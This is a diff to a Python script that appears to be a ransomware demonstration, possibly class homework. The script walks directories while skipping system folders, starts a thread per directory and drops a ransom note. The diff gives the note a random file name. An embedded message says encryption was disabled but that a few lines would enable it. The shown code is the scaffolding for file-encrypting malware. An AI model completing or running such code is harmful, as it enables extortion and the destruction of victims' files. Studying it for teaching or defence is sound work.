@@ -1,6 +1,7 @@
 import threading
 import os
 from .Utils import encrypt,key,encryptor
+from Utils.helpers import random_string
 IGNORE_LIST = {'windows', 'python', 'microsoft', 'system'}
 
 def parse_dir(root, folder):
@@ -17,8 +18,10 @@ def parse_dir(root, folder):
                         by the fact that can do 99% of the things on runtime.
                         for safety measure, i disabled the encrypt function. but if we add here 3-4 lines of easy code
                         this code could encrypt your files."""
-        with open(f'{root}/{folder}/fake_ransom_note.txt', 'w+') as q:
-            q.write(msg)
+        name = random_string(is_random=True)
+        if name + '.txt' not in os.listdir(os.path.join(root,folder)):
+            with open(f'{root}/{folder}/{name}.txt', 'w+') as q:
+                q.write(msg)
         for file in os.listdir(f"{root}/{folder}"):
             if not file.endswith('.py') and not file.endswith('.note.txt') and not file.endswith(
                     '.ThisIsClassHomeworks'):
@@ -36,3 +39,4 @@ def example_ransom():
                 continue
             else:
                 threading.Thread(target=parse_dir, args=(r, directory)).start()
+    return
